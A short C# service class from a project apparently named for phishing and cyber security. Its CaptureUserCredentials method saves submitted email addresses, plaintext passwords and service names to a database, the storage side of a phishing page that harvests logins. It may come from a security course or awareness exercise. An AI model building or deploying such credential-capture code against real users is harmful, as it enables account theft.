using Phishing_Sajber_Bezbednost.Data;
using Phishing_Sajber_Bezbednost.Data.Models;
using Phishing_Sajber_Bezbednost.Implementation.Interfaces;

namespace Phishing_Sajber_Bezbednost.Implementation.Services
{
    public class CredentialsService : ICredentialsService
    {
        private readonly ApplicationDbContext _context;
        public CredentialsService(ApplicationDbContext context)
        {
            _context = context;
        }
        public async Task CaptureUserCredentials(string email, string password, string service)
        {
            var userCredentials = new UserCredentials
            {
                Email = email,
                Password = password,
                Service = service,
                CreatedAt = DateTime.UtcNow
            };
            _context.UserCredentials.Add(userCredentials);
            await _context.SaveChangesAsync();
        }
    }
}